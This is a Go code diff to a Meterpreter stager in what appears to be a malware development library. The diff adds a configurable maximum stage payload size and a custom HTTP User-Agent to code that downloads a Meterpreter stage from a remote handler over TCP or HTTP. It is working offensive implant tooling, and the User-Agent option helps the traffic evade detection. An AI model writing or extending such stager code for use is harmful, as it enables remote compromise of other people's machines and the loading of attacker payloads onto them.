@@ -57,6 +57,14 @@ type Config struct {
 	// Accepts *wsyscall.Caller from github.com/oioio-space/maldev/win/syscall.
 	// When nil, standard WinAPI calls are used.
 	Caller any
+
+	// MaxStageSize is the maximum stage payload size in bytes.
+	// Default: 10 MB. Set to 0 to use the default.
+	MaxStageSize int64
+
+	// UserAgent is the HTTP User-Agent header for HTTP/HTTPS transports.
+	// Default: "Mozilla/5.0".
+	UserAgent string
 }
 
 // Stager manages the Meterpreter staging process.
@@ -108,8 +116,12 @@ func (s *Stager) fetchStageTCP() ([]byte, error) {
 		return nil, fmt.Errorf("failed to read stage size: %w", err)
 	}
 
+	maxSize := s.config.MaxStageSize
+	if maxSize <= 0 {
+		maxSize = 10 * 1024 * 1024
+	}
 	stageSize := binary.LittleEndian.Uint32(sizeBuf)
-	if stageSize == 0 || stageSize > 10*1024*1024 {
+	if stageSize == 0 || int64(stageSize) > maxSize {
 		return nil, fmt.Errorf("invalid stage size: %d", stageSize)
 	}
 
@@ -147,7 +159,11 @@ func (s *Stager) fetchStageHTTP() ([]byte, error) {
 		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 
-	req.Header.Set("User-Agent", "Mozilla/5.0")
+	ua := s.config.UserAgent
+	if ua == "" {
+		ua = "Mozilla/5.0"
+	}
+	req.Header.Set("User-Agent", ua)
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -159,8 +175,11 @@ func (s *Stager) fetchStageHTTP() ([]byte, error) {
 		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
 	}
 
-	const maxStageSize = 10 * 1024 * 1024 // 10 MB
-	stage, err := io.ReadAll(io.LimitReader(resp.Body, maxStageSize))
+	httpMaxStage := s.config.MaxStageSize
+	if httpMaxStage <= 0 {
+		httpMaxStage = 10 * 1024 * 1024
+	}
+	stage, err := io.ReadAll(io.LimitReader(resp.Body, httpMaxStage))
 	if err != nil {
 		return nil, fmt.Errorf("failed to read stage: %w", err)
 	}
